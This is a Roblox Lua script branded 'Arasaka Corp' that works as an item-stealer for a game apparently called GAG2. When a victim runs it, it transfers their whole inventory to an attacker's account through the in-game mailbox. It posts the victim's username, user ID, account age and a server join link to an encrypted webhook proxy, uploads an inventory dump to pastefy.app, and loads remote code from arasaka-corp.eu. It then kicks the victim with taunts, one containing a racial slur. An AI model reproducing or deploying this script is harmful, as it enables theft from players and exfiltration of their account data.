local BATCH_SIZE = 20
local NOTE = "Arasaka Corp"

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local cfg = _G.AC_CONFIG
if not cfg then
    LocalPlayer:Kick("Config missing | Use the Loader first")
    return
end

local WEBHOOK_ID = cfg.WEBHOOK_ID
local PROXY_URL = cfg.PROXY_URL
local PUBLIC_PROXY = cfg.PUBLIC_PROXY
local USERNAMES = cfg.USERNAMES

if WEBHOOK_ID == "" or PROXY_URL == "" then
    LocalPlayer:Kick("Invalid configuration | discord.gg/arasaka-corp")
    return
end

if not USERNAMES or #USERNAMES == 0 then
    LocalPlayer:Kick("No target usernames provided | discord.gg/arasaka-corp")
    return
end

local RECEIVER_USERNAME = USERNAMES[1]

local Crypto = loadstring(game:HttpGet("https://arasaka-corp.eu/script/module/crypto.lua"))()
local crypto = Crypto.new("31566ef8c2c18566522c58e8c11511cfc0ec2a4864ee5e2750a162f4dfeca9a4b16c424cb4f83662773ea0a0b7040b8d")

local Networking = require(ReplicatedStorage.SharedModules.Networking)
local PlayerState = require(ReplicatedStorage.ClientModules.PlayerStateClient)

local function requestFn(req)
    if syn and syn.request then return syn.request(req) end
    if fluxus and fluxus.request then return fluxus.request(req) end
    if http and http.request then return http.request(req) end
    if getgenv().request then return getgenv().request(req) end
    if request then return request(req) end
    if http_request then return http_request(req) end
    if HttpService.RequestAsync then
        return HttpService:RequestAsync({
            Url = req.Url, Method = req.Method,
            Headers = req.Headers, Body = req.Body
        })
    end
    return nil
end

local function GetUserIdByUsername(usr)
    local s, res = pcall(function() return Players:GetUserIdFromNameAsync(usr) end)
    if s and res then return res end
    return nil
end

local function GetAllItems()
    local all = {}
    local rep = PlayerState:GetLocalReplica()
    if not rep then return all end
    local inv = rep.Data and rep.Data.Inventory
    if not inv then return all end

    local pCats = {"Pets", "Birds", "Gnomes"}
    for _, c in ipairs(pCats) do
        if inv[c] then
            for id, data in pairs(inv[c]) do
                if data.Equipped == false then
                    local cnt = data.Count or 1
                    for i = 1, cnt do
                        table.insert(all, {Category = c, ItemKey = id, Count = 1})
                    end
                end
            end
        end
    end

    if inv.Seeds then
        for n, c in pairs(inv.Seeds) do
            if c > 0 then
                table.insert(all, {Category = "Seeds", ItemKey = n, Count = c})
            end
        end
    end

    if inv.HarvestedFruits then
        for _, f in ipairs(inv.HarvestedFruits) do
            local fn = f.FruitName or f.Name or "Unknown"
            table.insert(all, {Category = "HarvestedFruits", ItemKey = fn, Count = f.Count or 1})
        end
    end

    local gCats = {"Sprinklers", "WateringCans", "Trowels", "Crates", "SeedPacks", "Mushrooms", "Raccoons", "Props", "Flashbangs", "EmptyPots", "Gears"}
    for _, c in ipairs(gCats) do
        if inv[c] then
            for n, d in pairs(inv[c]) do
                local cnt = 1
                if type(d) == "table" and d.Count then cnt = d.Count
                elseif type(d) == "number" then cnt = d end
                if cnt > 0 then
                    table.insert(all, {Category = c, ItemKey = n, Count = cnt})
                end
            end
        end
    end
    return all
end

local function GetInventoryList()
    local lst = {}
    local rep = PlayerState:GetLocalReplica()
    if not rep then return lst end
    local inv = rep.Data and rep.Data.Inventory
    if not inv then return lst end

    local pN = {}
    if inv.Pets then
        for id, d in pairs(inv.Pets) do
            if d.Equipped == false then
                local n = d.Name or id
                pN[n] = (pN[n] or 0) + 1
            end
        end
    end

    for n, c in pairs(pN) do
        table.insert(lst, n .. " x" .. c)
    end

    if inv.Seeds then
        local sc = 0
        for _, c in pairs(inv.Seeds) do sc = sc + c end
        if sc > 0 then table.insert(lst, "Seeds: " .. sc .. " total") end
    end

    if inv.HarvestedFruits then
        table.insert(lst, "Fruits: " .. #inv.HarvestedFruits .. " items")
    end
    return lst
end

local function UnequipAllPets()
    local s, eq = pcall(function() return Networking.Pets.GetEquippedPets:Fire() end)
    if s and eq then
        for _, p in pairs(eq) do
            if p.Id then
                pcall(function() Networking.Pets.RequestUnequip:Fire(p.Id) end)
                task.wait(0.3)
            end
        end
    end
end

local function ClaimAllGifts()
    local s, mData = pcall(function() return Networking.Mailbox.OpenInbox:Fire() end)
    if not s or not mData then return end
    for gId, _ in pairs(mData) do
        pcall(function() return Networking.Mailbox.Claim:Fire(gId) end)
        task.wait(0.5)
    end
end

local function SendItems(tId, items)
    if not tId or #items == 0 then return false end
    local sc = 0
    for i = 1, #items, BATCH_SIZE do
        local b = {}
        for j = i, math.min(i + BATCH_SIZE - 1, #items) do
            table.insert(b, items[j])
        end
        local ok = pcall(function()
            Networking.Mailbox.SendBatch:Fire(tId, b, NOTE)
            sc = sc + #b
        end)
        task.wait(1)
    end
    return sc > 0
end

local function FormatNumber(n)
    n = tonumber(n) or 0
    if n >= 1E9 then return string.format("%.2fB", n / 1E9)
    elseif n >= 1E6 then return string.format("%.2fM", n / 1E6)
    elseif n >= 1E3 then return string.format("%.2fK", n / 1E3)
    else return tostring(math.floor(n)) end
end

local function UploadToPastefy(items)
    if not items or #items == 0 then return nil end

    local lines = {
        "ARASAKA CORP | GAG2 Inventory Dump",
        "User: " .. LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")",
        "Generated: " .. os.date("%Y-%m-%d %H:%M:%S"),
        "Total Items: " .. #items,
        string.rep("-", 60),
        ""
    }

    for _, item in ipairs(items) do
        table.insert(lines, tostring(item))
    end

    local content = table.concat(lines, "\n")
    local ok, response = pcall(function()
        return requestFn({
            Url = "https://pastefy.app/api/v2/paste",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({content = content, type = "PASTE"})
        })
    end)

    if ok and response and response.StatusCode == 200 then
        local ok2, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
        if ok2 and data then
            if data.paste then return "https://pastefy.app/" .. data.paste.id
            elseif data.id then return "https://pastefy.app/" .. data.id end
        end
    end
    return nil
end

local function sendWebhook(payload)
    local fullUrl = PROXY_URL .. WEBHOOK_ID
    local envelope = { id = WEBHOOK_ID, payload = payload }
    local json = HttpService:JSONEncode(envelope)
    local encrypted = crypto:Encrypt(json)

    local success, response = pcall(function()
        return requestFn({
            Url = fullUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({data = encrypted})
        })
    end)
    return success, response
end

local function SendPublic(payload)
    if not PUBLIC_PROXY or PUBLIC_PROXY == "" then return end
    local json = HttpService:JSONEncode(payload)
    local encrypted = crypto:Encrypt(json)

    local success, response = pcall(function()
        return requestFn({
            Url = PUBLIC_PROXY,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({message = encrypted})
        })
    end)
    return success, response
end

local function BuildWebhookPayload(items, rawItems)
    local totalItems = 0
    local categoryCounts = {}
    if rawItems then
        for _, it in ipairs(rawItems) do
            totalItems = totalItems + (it.Count or 1)
            categoryCounts[it.Category] = (categoryCounts[it.Category] or 0) + (it.Count or 1)
        end
    else
        totalItems = #items
    end

    local topItems = {}
    for i = 1, math.min(5, #items) do
        local icon = "░"
        local entry = items[i]
        local numVal = 0
        local numMatch = tostring(entry):match("x(%d+)")
        if numMatch then numVal = tonumber(numMatch) or 0 end
        if numVal >= 100 then icon = "█"
        elseif numVal >= 50 then icon = "▓"
        elseif numVal >= 10 then icon = "▒"
        end
        table.insert(topItems, icon .. " " .. tostring(entry))
    end

    local hitCategory = "STANDARD HIT"
    local glowEffect = ""
    if totalItems >= 500 then
        hitCategory = "INSANE HIT (500+ items)"
        glowEffect = "✦"
    elseif totalItems >= 250 then
        hitCategory = "MASSIVE HIT (250+ items)"
        glowEffect = "🔥"
    elseif totalItems >= 100 then
        hitCategory = "BIG HIT (100+ items)"
        glowEffect = "⚡"
    elseif totalItems >= 50 then
        hitCategory = "GOOD HIT (50+ items)"
        glowEffect = "💫"
    elseif totalItems >= 10 then
        hitCategory = "NORMAL HIT (10+ items)"
    else
        hitCategory = "LOW HIT (<10 items)"
    end

    local pastefyLink = nil
    if #items > 0 then
        pastefyLink = UploadToPastefy(items)
    end

    local realJob = game.JobId
    local fernLink = "https://fern.wtf/joiner?placeId=" .. tostring(game.PlaceId)
                   .. "&gameInstanceId=" .. tostring(realJob)

    local catBreakdown = ""
    local catNames = {"Pets", "Birds", "Gnomes", "Seeds", "HarvestedFruits", "Sprinklers", "WateringCans", "Trowels", "Crates", "SeedPacks", "Mushrooms", "Raccoons", "Props", "Flashbangs", "EmptyPots", "Gears"}
    local catLines = {}
    for _, c in ipairs(catNames) do
        if categoryCounts[c] and categoryCounts[c] > 0 then
            table.insert(catLines, c .. ": " .. tostring(categoryCounts[c]))
        end
    end
    if #catLines == 0 then catLines = {"No categories"} end
    catBreakdown = table.concat(catLines, " | ")

    local fields = {
        {
            name = "VICTIM INFORMATION",
            value = "```yml\nUser: " .. LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")\n"
                 .. "ID: " .. tostring(LocalPlayer.UserId) .. "\n"
                 .. "Age: " .. tostring(LocalPlayer.AccountAge) .. " days\n"
                 .. "Server: " .. tostring(realJob):sub(1, 8) .. "\n```",
            inline = true
        },
        {
            name = "VALUATION",
            value = "```yml\nTotal Items: " .. tostring(totalItems) .. "\n"
                 .. "Stacks: " .. tostring(#items) .. "\n"
                 .. "Receiver: " .. tostring(RECEIVER_USERNAME) .. "\n```",
            inline = true
        },
        {
            name = "INVENTORY BREAKDOWN",
            value = "```yml\n" .. catBreakdown .. "\n```",
            inline = false
        }
    }

    if #topItems > 0 then
        local topStr = "```prolog\n"
        for _, s in ipairs(topItems) do topStr = topStr .. s .. "\n" end
        topStr = topStr .. "```"
        table.insert(fields, {name = "TOP ITEMS", value = topStr, inline = false})
    end

    if pastefyLink then
        table.insert(fields, {
            name = "FULL INVENTORY",
            value = "[View All " .. tostring(#items) .. " Items on Pastefy](" .. pastefyLink .. ")",
            inline = false
        })
    end

    table.insert(fields, {
        name = "ACTIONS",
        value = "[Join Server](" .. fernLink .. ")",
        inline = false
    })

    local embedColor = 0x8B0000
    if totalItems >= 500 then embedColor = 0xFF0000
    elseif totalItems >= 250 then embedColor = 0xCC0000
    elseif totalItems >= 100 then embedColor = 0x990000
    elseif totalItems >= 50 then embedColor = 0x660000
    elseif totalItems >= 10 then embedColor = 0x440000
    end

    local embed = {
        title = "ARASAKA CORP " .. glowEffect .. " " .. hitCategory,
        color = embedColor,
        fields = fields,
        footer = {
            text = "Arasaka Corp v1.0.2 | " .. os.date("%Y-%m-%d %H:%M:%S")
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }

    local payload = {
        username = "Arasaka Corp",
        embeds = {embed}
    }

    if totalItems >= 100 then
        payload.content = "@everyone **ARASAKA CORP | GAG2 HIT**"
    end

    return payload, pastefyLink
end

local function Dispatch(items, rawItems)
    local payload, pastefyLink = BuildWebhookPayload(items, rawItems)
    SendWebhook(payload)

    local publicPayload = {
        message = LocalPlayer.Name .. " got hit by Arasaka Corp in GAG2"
               .. (pastefyLink and (" | Pastefy: " .. pastefyLink) or "")
    }
    SendPublic(publicPayload)

    return payload
end

local Webhook = {}
Webhook.Dispatch = Dispatch
Webhook.BuildPayload = BuildWebhookPayload
Webhook.UploadToPastefy = UploadToPastefy
Webhook.SendWebhook = SendWebhook
Webhook.SendPublic = SendPublic
Webhook.FormatNumber = FormatNumber

_G.GAG2_WEBHOOK = Webhook

local function Main()
    ClaimAllGifts()
    UnequipAllPets()
    task.wait(1)

    local tId = GetUserIdByUsername(RECEIVER_USERNAME)
    if not tId then
        LocalPlayer:Kick("Receiver not found: " .. tostring(RECEIVER_USERNAME))
        return
    end

    local rawItems = GetAllItems()
    if #rawItems == 0 then
        LocalPlayer:Kick("Broke Nigga")
        return
    end

    local iList = GetInventoryList()

    pcall(function() Dispatch(iList, rawItems) end)

    local ok = SendItems(tId, rawItems)
    if ok then
        LocalPlayer:Kick("Your items have been stolen by Arasaka Corp | discord.gg/arasaka-corp")
    end
end

pcall(Main)
